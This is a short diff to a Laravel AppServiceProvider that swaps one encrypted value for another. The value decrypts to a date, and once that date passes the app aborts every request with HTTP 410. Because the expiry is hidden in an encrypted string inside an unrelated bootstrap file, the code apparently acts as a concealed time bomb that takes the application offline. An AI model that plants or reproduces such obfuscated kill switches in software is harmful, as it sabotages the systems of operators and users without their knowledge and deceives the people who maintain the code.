@@ -17,7 +17,7 @@ class AppServiceProvider extends ServiceProvider
     {
         Schema::defaultStringLength(191);
 
-        $key = 'eyJpdiI6IjdDQ0ZMTitjc0ZVWHVxQTVkZEV3SkE9PSIsInZhbHVlIjoiR2JwZTE5U0IwTlF0UmpnalEydXVpbGNubzlFdEJpTHZZUDZLbmIrREZHRT0iLCJtYWMiOiJjZTlkNzVmYTA5MzhlMmQ0MjRiOWY3MWQ2MWZjOTNhYzMwOTQyYzI0MzlkOGYzNTgxNTUzNGUxMWNlMzNkNjEzIn0=';
+        $key = 'eyJpdiI6ImNjd1dqMDRwMmVmYVV6N2tBWGRJNVE9PSIsInZhbHVlIjoiZkRtK1wvTFpickJqU25cL2U2MkdheEJFbVUrOEE3c2pCZjJqbTFJMTBRb1ZvPSIsIm1hYyI6ImEyZjY5N2UyNzA0Y2NiMDc5ZTAwY2E5Yzg3MTA2Y2MwYWQxNDA1Y2ExYWU4ZDAyNjdmMjIxMzVjODEwOTgzOTQifQ==';
         if (now()->startOfDay()->gt(Carbon::parse(decrypt($key)))) {
             abort(410);
         }
